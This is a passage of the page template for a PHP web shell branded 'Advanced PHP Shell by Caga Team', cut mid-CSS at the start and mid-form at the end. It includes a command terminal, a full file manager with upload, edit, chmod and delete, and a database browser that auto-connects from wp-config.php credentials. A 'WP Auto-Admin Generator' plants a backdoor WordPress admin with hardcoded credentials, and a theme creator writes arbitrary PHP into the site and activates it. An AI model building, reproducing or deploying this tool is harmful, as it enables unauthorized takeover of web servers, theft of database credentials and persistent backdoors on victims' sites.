        .fm-toolbar {
            display: flex;
            gap: 6px;
            padding: 8px 12px;
            border-bottom: 1px solid #21262d;
            background: #0d1117;
            flex-wrap: wrap;
        }

        .mysql-panel {
            grid-column: span 2;
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 8px;
            overflow: hidden;
        }

        .mysql-body {
            padding: 14px;
            display: grid;
            grid-template-columns: 340px 1fr;
            gap: 14px;
        }

        .mysql-form label {
            display: block;
            font-size: 12px;
            color: #8b949e;
            margin-bottom: 3px;
            margin-top: 8px;
        }

        .mysql-form input {
            width: 100%;
            background: #0a0c10;
            border: 1px solid #30363d;
            color: #e6edf3;
            padding: 7px 10px;
            font-family: inherit;
            font-size: 13px;
            border-radius: 4px;
            outline: none;
        }

        .sql-area {
            font-family: inherit;
            background: #0a0c10;
            border: 1px solid #30363d;
            color: #e6edf3;
            width: 100%;
            min-height: 80px;
            padding: 10px;
            border-radius: 4px;
            resize: vertical;
            font-size: 13px;
        }

        .sql-result-wrap {
            overflow: auto;
            max-height: 260px;
        }

        table.sql-table {
            border-collapse: collapse;
            font-size: 12px;
            min-width: 100%;
        }

        table.sql-table th {
            background: #161b22;
            color: #58a6ff;
            padding: 6px 10px;
            border: 1px solid #30363d;
            text-align: left;
        }

        table.sql-table td {
            padding: 5px 10px;
            border: 1px solid #21262d;
            color: #e6edf3;
        }

        table.sql-table tr:nth-child(even) td {
            background: #0d1117;
        }

        /* phpMyAdmin panel */
        .pma-wrap { display:flex; height:480px; gap:0; overflow:hidden; }
        .pma-sidebar { width:210px; min-width:160px; background:#0a0c10; border-right:1px solid #21262d; display:flex; flex-direction:column; overflow:hidden; }
        .pma-sidebar-hdr { padding:7px 10px; font-size:11px; color:#8b949e; border-bottom:1px solid #21262d; display:flex; align-items:center; justify-content:space-between; flex-shrink:0; }
        .pma-sidebar-list { overflow-y:auto; flex:1; overflow-x:hidden; }
        .pma-item { padding:5px 12px; font-size:12px; cursor:pointer; color:#c9d1d9; border-bottom:1px solid #0d1117; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; display:block; }
        .pma-item:hover { background:#161b22; color:#58a6ff; }
        .pma-item.active { background:#1f2937; color:#7ee787; font-weight:bold; }
        .pma-item.db-item { color:#f0883e; font-size:11px; padding-left:10px; }
        .pma-item.db-item.active { color:#7ee787; }
        .pma-tbl-section-hdr { padding:4px 10px; font-size:10px; color:#6e7681; background:#0d1117; border-bottom:1px solid #21262d; flex-shrink:0; }
        .pma-main { flex:1; display:flex; flex-direction:column; overflow:hidden; min-width:0; }
        .pma-toolbar { padding:6px 10px; background:#0d1117; border-bottom:1px solid #21262d; display:flex; align-items:center; gap:8px; flex-wrap:wrap; flex-shrink:0; }
        .pma-content { flex:1; overflow:auto; padding:10px; }
        .pma-table-wrap { overflow:auto; max-height:100%; }
        table.pma-table { border-collapse:collapse; font-size:12px; min-width:100%; white-space:nowrap; }
        table.pma-table th { background:#161b22; color:#58a6ff; padding:5px 10px; border:1px solid #30363d; position:sticky; top:0; z-index:1; }
        table.pma-table td { padding:4px 10px; border:1px solid #21262d; color:#e6edf3; max-width:280px; overflow:hidden; text-overflow:ellipsis; }
        table.pma-table tr:hover td { background:#161b22; }
        table.pma-table td.null-val { color:#6e7681; font-style:italic; }
        table.pma-table td.act-col { white-space:nowrap; min-width:70px; }
        .pma-pagination { display:flex; align-items:center; gap:8px; padding:5px 10px; font-size:12px; color:#8b949e; border-top:1px solid #21262d; flex-shrink:0; }
        .pma-sql-bar { padding:8px 10px; border-top:1px solid #21262d; display:flex; gap:6px; flex-shrink:0; }
        .pma-sql-bar textarea { flex:1; background:#0a0c10; border:1px solid #30363d; color:#e6edf3; padding:6px 8px; font-size:12px; font-family:monospace; border-radius:4px; resize:none; height:48px; }
        .panel-toggle { cursor:pointer; font-size:11px; color:#8b949e; background:#161b22; border:1px solid #30363d; border-radius:4px; padding:2px 8px; margin-left:auto; }
        .panel-toggle:hover { color:#c9d1d9; border-color:#58a6ff; }
        .collapsible-body { display:none; }
        .collapsible-body.open { display:block; }

        .msg-ok {
            color: #7ee787;
            font-size: 13px;
            padding: 4px 0;
        }

        .msg-err {
            color: #f85149;
            font-size: 13px;
            padding: 4px 0;
        }

        .badge {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 10px;
            font-size: 11px;
        }

        .badge-on {
            background: #238636;
            color: #fff;
        }

        .badge-off {
            background: #6e1a1a;
            color: #fca5a5;
        }

        .credit-footer {
            grid-column: span 2;
            text-align: center;
            margin-top: 12px;
            color: #6e7681;
            font-size: 12px;
            border-top: 1px solid #21262d;
            padding-top: 10px;
        }

        .edit-area {
            background: #0a0c10;
            border: 1px solid #30363d;
            color: #e6edf3;
            width: 100%;
            min-height: 300px;
            font-family: monospace;
            padding: 10px;
        }

        /* Modal */
        .modal-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.7);
            z-index: 100;
            align-items: center;
            justify-content: center;
        }

        .modal-overlay.show {
            display: flex;
        }

        .modal {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 10px;
            padding: 20px;
            min-width: 300px;
            max-width: 500px;
            width: 100%;
            position: relative;
        }

        .modal h3 {
            color: #58a6ff;
            margin-bottom: 12px;
            font-size: 14px;
        }

        .modal input {
            width: 100%;
            background: #0a0c10;
            border: 1px solid #30363d;
            color: #e6edf3;
            padding: 8px 10px;
            border-radius: 4px;
            font-family: inherit;
            font-size: 13px;
            margin-bottom: 10px;
            outline: none;
        }

        .modal input:focus {
            border-color: #58a6ff;
        }

        .modal-close {
            position: absolute;
            top: 10px;
            right: 14px;
            color: #8b949e;
            cursor: pointer;
            font-size: 18px;
            background: none;
            border: none;
            font-family: inherit;
        }

        .modal-close:hover {
            color: #e6edf3;
        }

        .modal .btn-row {
            display: flex;
            gap: 8px;
            justify-content: flex-end;
            margin-top: 4px;
        }

        /* Search results */
        .search-panel {
            grid-column: span 2;
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 8px;
            overflow: hidden;
        }

        .search-result-item {
            display: grid;
            grid-template-columns: 18px 1fr 80px;
            padding: 5px 12px;
            border-bottom: 1px solid #21262d;
            font-size: 12px;
            align-items: center;
            gap: 6px;
        }

        .search-result-item:hover {
            background: #161b22;
        }

        /* Dir size display */
        .dir-size-val {
            font-size: 10px;
            color: #3fb950;
            margin-left: 4px;
        }

        /* ZIP extract checkbox */
        .extract-checkbox {
            display: inline-flex;
            align-items: center;
            margin-left: 15px;
            font-size: 12px;
            color: #c9d1d9;
        }

        .extract-checkbox input {
            margin-right: 4px;
        }

        ::-webkit-scrollbar {
            width: 7px;
            height: 7px;
        }

        ::-webkit-scrollbar-track {
            background: #0d1117;
        }

        ::-webkit-scrollbar-thumb {
            background: #30363d;
            border-radius: 4px;
        }
    </style>
</head>

<body>
    <div class="container">

        <!-- ===== TERMINAL ===== -->
        <div class="terminal-panel">
            <div class="panel-hdr">
                <span class="panel-title">🐚 <?= htmlspecialchars($user . '@' . php_uname('n')) ?></span>
                <span class="sys-info">PHP <?= $phpVer ?> | <?= htmlspecialchars($serverSW) ?></span>
            </div>
            <div class="terminal-body">
                <div class="output-area" id="outputArea">
                    <?php if (!empty($uploadMsg)): ?>
                        <div style="color:#7ee787;margin-bottom:10px;"><?= nl2br(htmlspecialchars($uploadMsg)) ?></div>
                    <?php elseif ($output === '__CLEAR__'): ?>
                    <?php elseif ($command !== ''): ?>
                        <div><span class="prompt">$</span><span><?= htmlspecialchars($command) ?></span></div>
                        <pre
                            style="margin:4px 0 15px;font-family:inherit;color:#e6edf3;"><?= htmlspecialchars($output) ?></pre>
                    <?php else: ?>
                        <div style="color:#8b949e;">
                            Welcome to PHP Shell.<br>
                            System: <?= htmlspecialchars($uname) ?><br>
                            Dir: <?= htmlspecialchars($currentDir) ?><br>
                            User: <?= htmlspecialchars($user) ?><br><br>
                            Built-in: <b>cd</b> | <b>clear</b><br>
                            <?php if (!function_exists('exec') && !function_exists('shell_exec') && !function_exists('system') && !function_exists('passthru')): ?>
                                <span style="color:#f0883e;">⚠️ Terminal commands are disabled. Use File Manager instead.</span>
                            <?php endif; ?>
                        </div>
                    <?php endif; ?>
                </div>

                <?php if (!empty($_SESSION['history'])): ?>
                    <div class="hist-wrap">
                        <select class="hist-sel" onchange="fillCmd(this.value)">
                            <option value="">📜 History</option>
                            <?php foreach ($_SESSION['history'] as $h): ?>
                                <option value="<?= htmlspecialchars($h, ENT_QUOTES) ?>"><?= htmlspecialchars($h) ?></option>
                            <?php endforeach; ?>
                        </select>
                        <button class="btn btn-sm" onclick="clearHist()">Clear</button>
                    </div>
                <?php endif; ?>

                <form method="post" class="cmd-form">
                    <input type="hidden" name="action" value="exec">
                    <input type="text" name="cmd" class="cmd-input" id="cmdInput"
                        placeholder="<?= htmlspecialchars($currentDir) ?> $ ..." autofocus autocomplete="off">
                    <button type="submit" class="btn btn-primary">Run</button>
                </form>
            </div>
        </div>

        <!-- ===== FILE MANAGER ===== -->
        <div class="file-panel">
            <div class="panel-hdr" style="color:#f0883e;">
                📁 File Manager
                <?php if (!$hasZip): ?>
                    <span style="font-size:10px;color:#6e7681;margin-left:8px;">(ZipArchive not available)</span>
                <?php endif; ?>
            </div>

            <!-- Toolbar -->
            <form id="bulkForm" method="POST" action="?action=bulk_delete">
                <div class="fm-toolbar">
                    <button type="button" class="btn btn-sm btn-info" onclick="toggleSelectAll()">☑️ Select All</button>
                    <button type="button" class="btn btn-sm btn-danger" onclick="submitBulkDelete()">🗑️ Delete
                        Selected</button>
                    <button type="button" class="btn btn-sm btn-info" onclick="openModal('mkdirModal')">📁 New
                        Dir</button>
                    <button type="button" class="btn btn-sm btn-info" onclick="openModal('newfileModal')">📄 New
                        File</button>
                    <button type="button" class="btn btn-sm btn-info" onclick="openModal('searchModal')">🔍 Search</button>
                    <?php if ($hasZip && $currentDir !== '/'): ?>
                        <a class="btn btn-sm btn-warning" href="?action=downloaddir&dir=<?= urlencode($currentDir) ?>"
                            onclick="return confirm('Download current dir as ZIP?')"
                            title="Download current directory as ZIP">
                            ⬇️ ZIP Dir
                        </a>
                    <?php endif; ?>
                    <span style="margin-left:auto;font-size:11px;color:#6e7681;" id="totalSizeLabel"></span>
                </div>

                <!-- Path Bar -->
                <div class="path-bar">
                    <span>📂</span>
                    <?php
                    $parts = explode(DIRECTORY_SEPARATOR, trim($currentDir, DIRECTORY_SEPARATOR));
                    $built = '';
                    echo '<a href="?action=cd&dir=' . urlencode('/') . ' " class="path-part">/</a>';
                    foreach ($parts as $p) {
                        if ($p === '')
                            continue;
                        $built .= DIRECTORY_SEPARATOR . $p;
                        echo ' <span style="color:#6e7681;">/</span> ';
                        echo '<a href="?action=cd&dir=' . urlencode($built) . '" class="path-part">' . htmlspecialchars($p) . '</a>';
                    }
                    ?>
                </div>

                <?php if ($currentDir !== $parentDir): ?>
                    <div style="padding:5px 12px;border-bottom:1px solid #21262d;">
                        <a href="?action=cd&dir=<?= urlencode($parentDir) ?>" style="color:#f0883e;text-decoration:none;">⬆️
                            ..</a>
                    </div>
                <?php endif; ?>

                <div class="file-list">
                    <?php foreach ($dirItems as $item): ?>
                        <div class="file-item">
                            <input type="checkbox" name="files[]" value="<?= htmlspecialchars($item['name']) ?>"
                                class="bulk-cb" />
                            <span><?= $item['isDir'] ? '📁' : '📄' ?></span>
                            <span class="<?= $item['isDir'] ? 'dir-link' : 'file-name' ?>">
                                <?php if ($item['isDir']): ?>
                                    <a
                                        href="?action=cd&dir=<?= urlencode($item['path']) ?>"><?= htmlspecialchars($item['name']) ?>/</a>
                                    <span class="dir-size-val" id="ds_<?= md5($item['path']) ?>"></span>
                                <?php else: ?>
                                    <a
                                        href="?action=download&file=<?= urlencode($item['path']) ?>"><?= htmlspecialchars($item['name']) ?></a>
                                <?php endif; ?>
                            </span>
                            <span class="fmeta"><?= $item['size'] ?></span>
                            <span class="fmeta"><?= $item['perms'] ?></span>
                            <span class="actions">
                                <?php if ($item['isDir']): ?>
                                    <button type="button" class="action-btn dirsize-btn"
                                        data-path="<?= htmlspecialchars($item['path']) ?>"
                                        data-labelid="ds_<?= md5($item['path']) ?>" title="Check size">📊</button>
                                    <?php if ($hasZip): ?>
                                        <a href="?action=downloaddir&dir=<?= urlencode($item['path']) ?>" class="action-btn"
                                            title="Download as ZIP"
                                            onclick="return confirm('ZIP & download <?= htmlspecialchars($item['name'], ENT_QUOTES) ?>?')">⬇️</a>
                                    <?php endif; ?>
                                    <button type="button" class="action-btn rename-btn"
                                        data-path="<?= htmlspecialchars($item['path']) ?>"
                                        data-name="<?= htmlspecialchars($item['name']) ?>" title="Rename">✏️</button>
                                    <button type="button" class="action-btn chmod-btn"
                                        data-path="<?= htmlspecialchars($item['path']) ?>"
                                        data-perms="<?= htmlspecialchars($item['perms']) ?>" title="Chmod">🔑</button>
                                    <a href="?action=cleardir&dir=<?= urlencode($item['path']) ?>" class="action-btn"
                                        style="color:#e3b341;"
                                        onclick="return confirm('Clear dir <?= htmlspecialchars($item['name'], ENT_QUOTES) ?>?\nThis deletes ALL contents inside it (keeps the folder itself).')"
                                        title="Clear Directory">🧹</a>
                                    <a href="?action=deletedir&dir=<?= urlencode($item['path']) ?>" class="action-btn del-btn"
                                        onclick="return confirm('Delete dir <?= htmlspecialchars($item['name'], ENT_QUOTES) ?> and all its contents?')"
                                        title="Delete">🗑️</a>
                                <?php else: ?>
                                    <a href="?action=view&file=<?= urlencode($item['path']) ?>" class="action-btn"
                                        target="_blank" title="View">👁️</a>
                                    <a href="?action=edit&file=<?= urlencode($item['path']) ?>" class="action-btn"
                                        title="Edit">✏️</a>
                                    <a href="?action=download&file=<?= urlencode($item['path']) ?>" class="action-btn"
                                        title="Download">⬇️</a>
                                    <button type="button" class="action-btn copy-btn"
                                        data-path="<?= htmlspecialchars($item['path']) ?>"
                                        data-name="<?= htmlspecialchars($item['name']) ?>" title="Copy">📋</button>
                                    <button type="button" class="action-btn rename-btn"
                                        data-path="<?= htmlspecialchars($item['path']) ?>"
                                        data-name="<?= htmlspecialchars($item['name']) ?>" title="Rename">🔄</button>
                                    <button type="button" class="action-btn chmod-btn"
                                        data-path="<?= htmlspecialchars($item['path']) ?>"
                                        data-perms="<?= htmlspecialchars($item['perms']) ?>" title="Chmod">🔑</button>
                                    <a href="?action=delete&file=<?= urlencode($item['path']) ?>" class="action-btn del-btn"
                                        onclick="return confirm('Delete <?= htmlspecialchars($item['name'], ENT_QUOTES) ?>?')"
                                        title="Delete">✕</a>
                                <?php endif; ?>
                            </span>
                        </div>
                    <?php endforeach; ?>
                    <?php if (empty($dirItems)): ?>
                        <div style="padding:20px;text-align:center;color:#6e7681;">Empty directory</div>
                    <?php endif; ?>
                </div>
            </form>

            <div class="upload-area">
                <form method="post" enctype="multipart/form-data">
                    <input type="hidden" name="action" value="upload">
                    <label style="font-size:12px;display:block;margin-bottom:4px;">⬆️ Upload to:
                        <?= htmlspecialchars(basename($currentDir)) ?>/</label>
                    <input type="file" name="files[]" multiple style="color:#e6edf3;width:100%;font-size:12px;">
                    <div style="display:flex; align-items:center; margin-top:6px;">
                        <button type="submit" class="btn btn-sm"
                            style="background:#1f6feb;border-color:#1f6feb;color:#fff;">Upload</button>
                        <label class="extract-checkbox">
                            <input type="checkbox" name="extract_zip" value="1"> Extract ZIP after upload
                        </label>
                        <span style="font-size:11px;color:#6e7681;margin-left:auto;">Max
                            <?= formatSize($max_upload) ?></span>
                    </div>
                </form>
            </div>
        </div>

        <!-- ===== EDIT FILE ===== -->
        <?php if ($action === 'edit' && $editFile): ?>
            <div class="mysql-panel" style="margin-top:16px;">
                <div class="panel-hdr">
                    <span class="panel-title">✏️ Editing: <?= htmlspecialchars(basename($editFile)) ?></span>
                </div>
                <div class="mysql-body" style="grid-template-columns:1fr;">
                    <form method="post">
                        <input type="hidden" name="action" value="saveedit">
                        <input type="hidden" name="editfile" value="<?= htmlspecialchars($editFile) ?>">
                        <textarea name="content" class="edit-area"
                            wrap="off"><?= htmlspecialchars($editContent) ?></textarea>
                        <div style="margin-top:10px;">
                            <button type="submit" class="btn btn-primary">Save Changes</button>
                            <a href="<?= $_SERVER['PHP_SELF'] ?>" class="btn" style="margin-left:8px;">Cancel</a>
                        </div>
                    </form>
                </div>
            </div>
        <?php endif; ?>

        <!-- ===== SEARCH RESULTS ===== -->
        <?php if ($searchResults !== null): ?>
            <div class="search-panel">
                <div class="panel-hdr">
                    <span class="panel-title">🔍 Search: "<?= htmlspecialchars($searchKeyword) ?>" —
                        <?= count($searchResults) ?> result(s) in <?= htmlspecialchars($currentDir) ?></span>
                </div>
                <?php if (empty($searchResults)): ?>
                    <div style="padding:16px;color:#6e7681;">No files found.</div>
                <?php else: ?>
                    <div style="max-height:300px;overflow-y:auto;">
                        <?php foreach ($searchResults as $r): ?>
                            <div class="search-result-item">
                                <span><?= $r['isDir'] ? '📁' : '📄' ?></span>
                                <span
                                    style="font-size:11px;color:#8b949e;word-break:break-all;"><?= htmlspecialchars($r['path']) ?></span>
                                <span class="actions">
                                    <?php if (!$r['isDir']): ?>
                                        <a href="?action=view&file=<?= urlencode($r['path']) ?>" class="action-btn" target="_blank"
                                            title="View">👁️</a>
                                        <a href="?action=download&file=<?= urlencode($r['path']) ?>" class="action-btn"
                                            title="Download">⬇️</a>
                                    <?php else: ?>
                                        <a href="?action=cd&dir=<?= urlencode($r['path']) ?>" class="action-btn" title="Open">📂</a>
                                    <?php endif; ?>
                                </span>
                            </div>
                        <?php endforeach; ?>
                    </div>
                <?php endif; ?>
            </div>
        <?php endif; ?>

        <!-- ===== phpMyAdmin PANEL ===== -->
        <div class="mysql-panel">
            <div class="panel-hdr" style="display:flex;align-items:center;gap:10px;">
                <span class="panel-title">🐬 phpMyAdmin</span>
                <?php if (!empty($mysqlConn['connected'])): ?>
                    <span class="badge badge-on">● <?= htmlspecialchars($mysqlConn['user'].'@'.$mysqlConn['host']) ?><?= $mysqlConn['db'] ? ' / '.$mysqlConn['db'] : '' ?></span>
                    <a href="?action=mysqldisconn" class="btn btn-sm btn-danger" style="font-size:11px;padding:2px 8px;">Disconnect</a>
                <?php else: ?>
                    <span class="badge badge-off">● Not Connected</span>
                <?php endif; ?>
                <button class="panel-toggle" onclick="togglePanel('pmaPanel','pmaToggle')" id="pmaToggle">▼ hide</button>
            </div>
            <div class="collapsible-body open" id="pmaPanel">
            <?php if (!empty($dbMsg)): ?>
                <div style="padding:6px 14px;">
                    <div class="<?= strpos($dbMsg,'✔')!==false?'msg-ok':'msg-err' ?>"><?= htmlspecialchars($dbMsg) ?></div>
                </div>
            <?php endif; ?>
            <?php if (empty($mysqlConn['connected'])): ?>
                <!-- Connect Form -->
                <div style="padding:14px;display:grid;grid-template-columns:1fr 1fr;gap:14px;">
                    <div>
                        <form method="post" class="mysql-form">
                            <input type="hidden" name="action" value="mysqlconn">
                            <label>Host</label>
                            <input type="text" name="mhost" value="<?= htmlspecialchars($mysqlConn['host'] ?? 'localhost') ?>" placeholder="localhost">
                            <label>Username</label>
                            <input type="text" name="muser" value="<?= htmlspecialchars($mysqlConn['user'] ?? '') ?>" placeholder="root">
                            <label>Password</label>
                            <input type="password" name="mpass" placeholder="••••••••">
                            <label>Database (optional)</label>
                            <input type="text" name="mdb" value="<?= htmlspecialchars($mysqlConn['db'] ?? '') ?>" placeholder="my_database">
                            <button type="submit" class="btn btn-primary" style="margin-top:10px;width:100%;">🔌 Connect</button>
                        </form>
                    </div>
                    <div style="display:flex;flex-direction:column;justify-content:center;gap:10px;">
                        <div style="font-size:12px;color:#8b949e;margin-bottom:4px;">Or auto-connect from WordPress config:</div>
                        <a href="?action=mysql_autoconn" class="btn btn-primary" style="text-decoration:none;text-align:center;">⚡ Auto-Connect from wp-config.php</a>
                        <div style="font-size:11px;color:#6e7681;">Searches wp-config.php up to 25 levels from current directory.</div>
                    </div>
                </div>
            <?php else: ?>
                <!-- phpMyAdmin UI -->
                <div class="pma-wrap" id="pmaWrap">
                    <!-- Sidebar: DBs & Tables -->
                    <div class="pma-sidebar">
                        <div class="pma-sidebar-hdr">
                            <span>Databases</span>
                            <button class="btn btn-sm" style="font-size:10px;padding:1px 6px;" onclick="pmaListDbs()">⟳</button>
                        </div>
                        <!-- Single scrollable list — DBs + Tables both go in here -->
                        <div class="pma-sidebar-list" id="pmaDbList">
                            <div style="padding:8px;font-size:11px;color:#6e7681;">Loading...</div>
                        </div>
                    </div>
                    <!-- Main content -->
                    <div class="pma-main">
                        <div class="pma-toolbar" id="pmaToolbar">
                            <span id="pmaBreadcrumb" style="font-size:12px;color:#8b949e;">Select a database →</span>
                            <div style="margin-left:auto;display:flex;gap:6px;" id="pmaTableBtns" style="display:none;">
                                <button class="btn btn-sm btn-primary" onclick="pmaShowInsert()" id="btnInsert" style="display:none;font-size:11px;">+ Insert Row</button>
                                <button class="btn btn-sm" onclick="pmaRefreshTable()" id="btnRefresh" style="display:none;font-size:11px;">⟳ Refresh</button>
                            </div>
                        </div>
                        <div class="pma-content" id="pmaContent">
                            <div style="color:#6e7681;font-size:12px;padding:20px;">Select a database from the left panel.</div>
                        </div>
                        <div class="pma-pagination" id="pmaPagination" style="display:none;">
                            <button class="btn btn-sm" onclick="pmaPrevPage()" id="btnPrev">◀ Prev</button>
                            <span id="pmaPageInfo">Page 1</span>
                            <button class="btn btn-sm" onclick="pmaNextPage()" id="btnNext">Next ▶</button>
                            <span id="pmaTotalInfo" style="margin-left:8px;"></span>
                        </div>
                        <div class="pma-sql-bar">
                            <textarea id="pmaSqlInput" placeholder="SELECT * FROM table LIMIT 20;&#10;Or any SQL..."></textarea>
                            <div style="display:flex;flex-direction:column;gap:4px;">
                                <button class="btn btn-sm btn-primary" onclick="pmaRunSql()" style="font-size:11px;">▶ Run SQL</button>
                                <button class="btn btn-sm" onclick="pmaClearSql()" style="font-size:11px;">✕ Clear</button>
                            </div>
                        </div>
                    </div>
                </div>
            <?php endif; ?>
            </div>
        </div>

        <!-- ===== WP AUTO-ADMIN PANEL (hidden by default) ===== -->
        <div class="mysql-panel" style="margin-top:0;">
            <div class="panel-hdr" style="display:flex;align-items:center;gap:10px;">
                <span class="panel-title">🛡️ WP Auto-Admin Generator</span>
                <span style="font-size:11px;color:#8b949e;">caga / caga@cagamerdeka.com / Caga123</span>
                <button class="panel-toggle" onclick="togglePanel('wpAdminPanel','wpAdminToggle')" id="wpAdminToggle">▶ show</button>
            </div>
            <div class="collapsible-body" id="wpAdminPanel">
                <div style="padding:12px 14px;">
                    <div style="font-size:12px;color:#8b949e;margin-bottom:10px;line-height:1.6;">
                        Automatically finds <code style="color:#58a6ff;">wp-load.php</code> &amp; <code style="color:#58a6ff;">wp-config.php</code>
                        by walking UP up to <strong>25 levels</strong> from the current directory.<br>
                        Parses DB credentials → connects → hashes password → creates/resets WP admin.
                    </div>
                    <?php if ($wpAutoLog !== null): ?>
                        <div style="background:#0a0c10;border:1px solid #21262d;border-radius:6px;padding:12px;margin-bottom:10px;font-size:12px;font-family:inherit;">
                            <?php foreach ($wpAutoLog as $entry): ?>
                                <div style="color:<?= $entry['ok'] ? '#7ee787' : '#f85149' ?>;margin-bottom:3px;">
                                    <?= $entry['ok'] ? '✔' : '✘' ?>  <?= htmlspecialchars($entry['msg']) ?>
                                </div>
                            <?php endforeach; ?>
                        </div>
                    <?php endif; ?>
                    <form method="post" onsubmit="return confirm('Run WP Auto-Admin from current directory?\n\nThis will:\n1. Search for wp-load.php & wp-config.php (up to 25 levels)\n2. Parse DB credentials\n3. Connect MySQL\n4. Create/reset admin user: caga / Caga123')">
                        <input type="hidden" name="action" value="wp_autoadmin">
                        <button type="submit" class="btn btn-primary">⚡ Run WP Auto-Admin</button>
                        <span style="font-size:11px;color:#6e7681;margin-left:10px;">No MySQL connection needed — reads wp-config.php directly</span>
                    </form>
                </div>
            </div>
        </div>

        <!-- ===== WP THEME CREATOR PANEL (hidden by default) ===== -->
        <div class="mysql-panel" style="margin-top:0;">
            <div class="panel-hdr" style="display:flex;align-items:center;gap:10px;">
                <span class="panel-title">🎨 WP Theme Creator</span>
                <span style="font-size:11px;color:#8b949e;">Create &amp; activate a custom WordPress theme from HTML</span>
                <button class="panel-toggle" onclick="togglePanel('wpThemePanel','wpThemeToggle')" id="wpThemeToggle">▶ show</button>
            </div>
            <div class="collapsible-body" id="wpThemePanel">
                <div style="padding:12px 14px;">
                    <div style="font-size:12px;color:#8b949e;margin-bottom:10px;line-height:1.6;">
                        Input your full HTML → PHP validates syntax → theme files written to
                        <code style="color:#58a6ff;">wp-content/themes/&lt;slug&gt;/</code> →
                        theme activated in DB → optionally set as homepage.
                    </div>
                    <?php if ($wpThemeLog !== null): ?>
                        <div style="background:#0a0c10;border:1px solid #21262d;border-radius:6px;padding:12px;margin-bottom:10px;font-size:12px;font-family:inherit;">
                            <?php foreach ($wpThemeLog as $entry): ?>
                                <div style="color:<?= $entry['ok'] ? '#7ee787' : '#f85149' ?>;margin-bottom:3px;">
                                    <?= $entry['ok'] ? '✔' : '✘' ?> <?= htmlspecialchars($entry['msg']) ?>
                                </div>
                            <?php endforeach; ?>
                        </div>
                    <?php endif; ?>
                    <form method="post" onsubmit="return confirm('Create &amp; activate WP theme?\n\nThis will write files to wp-content/themes/ and modify the database.')">
                        <input type="hidden" name="action" value="wp_createtheme">
                        <div style="display:flex;gap:10px;margin-bottom:8px;flex-wrap:wrap;">
                            <div style="flex:1;min-width:160px;">
                                <label style="font-size:11px;color:#8b949e;display:block;margin-bottom:3px;">Theme Slug (folder name)</label>
                                <input type="text" name="theme_slug" value="<?= htmlspecialchars($action === 'wp_createtheme' ? ($wpThemeSlug ?? 'caga-theme') : 'caga-theme') ?>"
                                    placeholder="caga-theme" pattern="[a-zA-Z0-9\-]+" style="width:100%;box-sizing:border-box;">
                            </div>
                            <div style="flex:2;min-width:200px;">
                                <label style="font-size:11px;color:#8b949e;display:block;margin-bottom:3px;">Theme Display Name</label>
                                <input type="text" name="theme_name" value="<?= htmlspecialchars($action === 'wp_createtheme' ? ($wpThemeName ?? 'Caga Custom Theme') : 'Caga Custom Theme') ?>"
                                    placeholder="Caga Custom Theme" style="width:100%;box-sizing:border-box;">
                            </div>
                        </div>
                        <div style="margin-bottom:8px;">
                            <label style="font-size:11px;color:#8b949e;display:block;margin-bottom:3px;">
                                Theme HTML Content
                                <span style="color:#6e7681;">(full page HTML — can include &lt;?php ?&gt; tags)</span>
                            </label>
                            <textarea name="theme_html" rows="12" placeholder="<!DOCTYPE html>&#10;<html>&#10;<head>&#10;  <meta charset=&quot;UTF-8&quot;>&#10;  <title>My Site</title>&#10;</head>&#10;<body>&#10;  <h1>Welcome!</h1>&#10;  <p>My custom homepage.</p>&#10;</body>&#10;</html>"
                                style="width:100%;box-sizing:border-box;font-family:monospace;font-size:12px;background:#0a0c10;color:#c9d1d9;border:1px solid #30363d;border-radius:4px;padding:8px;resize:vertical;"><?= htmlspecialchars($action === 'wp_createtheme' ? ($_POST['theme_html'] ?? '') : '') ?></textarea>
                        </div>
                        <div style="display:flex;align-items:center;gap:16px;flex-wrap:wrap;">
                            <label style="font-size:12px;color:#c9d1d9;cursor:pointer;display:flex;align-items:center;gap:6px;">
                                <input type="checkbox" name="set_homepage" value="1" <?= ($action !== 'wp_createtheme' || !empty($_POST['set_homepage'])) ? 'checked' : '' ?>>
                                Set as WordPress homepage (show_on_front)
                            </label>
                            <button type="submit" class="btn btn-primary">🎨 Create &amp; Activate Theme</button>
                        </div>
                    </form>

                    <!-- ── Purge Cache ───────────────────────────── -->
                    <div style="margin-top:14px;padding-top:12px;border-top:1px solid #21262d;">
                        <div style="font-size:12px;color:#8b949e;margin-bottom:8px;">
                            Hapus semua <strong>transient WP</strong> &amp; flush <strong>rewrite rules</strong> dari database (tanpa exec).
                        </div>
                        <?php if ($wpPurgeLog !== null): ?>
                            <div style="background:#0a0c10;border:1px solid #21262d;border-radius:6px;padding:12px;margin-bottom:10px;font-size:12px;font-family:inherit;">
                                <?php foreach ($wpPurgeLog as $entry): ?>
                                    <div style="color:<?= $entry['ok'] ? '#7ee787' : '#f85149' ?>;margin-bottom:3px;">
                                        <?= $entry['ok'] ? '✔' : '✘' ?> <?= htmlspecialchars($entry['msg']) ?>
                                    </div>
                                <?php endforeach; ?>
                            </div>
                        <?php endif; ?>
                        <form method="post" onsubmit="return confirm('Purge WP transients &amp; flush rewrite rules?\n\nIni akan menghapus semua cache transient dari database.')">
                            <input type="hidden" name="action" value="wp_purge">
                            <button type="submit" class="btn btn-warning">🧹 Purge WP Cache</button>
                            <span style="font-size:11px;color:#6e7681;margin-left:10px;">Reads wp-config.php up to 25 levels — no exec needed</span>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <div class="credit-footer">
            ⚡ Advanced PHP Shell by <strong>Caga Team</strong> ⚡
            &nbsp;|&nbsp;
            <span style="color:#8b949e;">v<?= SHELL_VERSION ?></span>
            &nbsp;
            <a href="?action=checkupdate" class="btn btn-sm btn-info" style="font-size:11px;padding:3px 10px;text-decoration:none;" title="Check for updates from GitHub">🔄 Check Update</a>
            <?php if ($action === 'checkupdate' && $updateResult !== null): ?>
                <?php if ($updateResult['error']): ?>
                    <span style="color:#f0883e;font-size:12px;">⚠️ <?= htmlspecialchars($updateResult['error']) ?></span>
                <?php elseif ($updateResult['has_update']): ?>
                    <span style="color:#7ee787;font-size:12px;">✨ New version: <strong><?= htmlspecialchars($updateResult['remote_version']) ?></strong></span>
                    <form method="post" action="?action=doupdate" style="display:inline;margin-left:8px;"
                        onsubmit="return confirm('Update to v<?= htmlspecialchars($updateResult['remote_version']) ?>?\nA backup will be created first.')">
